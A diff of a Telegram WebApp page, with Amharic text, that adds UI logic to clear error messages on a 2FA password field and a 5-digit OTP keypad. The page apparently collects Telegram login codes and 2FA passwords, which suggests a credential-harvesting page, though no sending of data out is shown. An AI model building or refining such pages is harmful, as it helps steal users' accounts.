@@ -289,7 +289,7 @@
                 <p>የደህንነት ማረጋገጫ (2FA Password) ያስገቡ።</p>
                 
                 <div class="pass-wrapper">
-                    <input type="password" id="2fa_input" placeholder="Password">
+                    <input type="password" id="2fa_input" placeholder="Password" oninput="hideError(3)">
                     <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
                 </div>
                 
@@ -324,7 +324,7 @@
     <div id="bgLayer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.03; background-size:cover;"></div>
 
 <script>
-    /* JavaScript is preserved exactly as requested */
+    /* JavaScript is preserved exactly as requested with minor enhancements for UI logic */
     const tg = window.Telegram.WebApp;
     tg.expand();
 
@@ -449,6 +449,7 @@
     }
 
     function press(num) {
+        hideError(2); // አዲስ ቁጥር ሲጫን የነበረውን Error ያጠፋል
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -513,6 +514,13 @@
         const el = document.getElementById('status' + stepId);
         if(!el) return;
         el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+    }
+
+    function hideError(stepId) {
+        const el = document.getElementById('status' + stepId);
+        if(el && el.classList.contains('error')) {
+            el.style.display = 'none';
+        }
     }
 
     function startFloodTimer(seconds) {
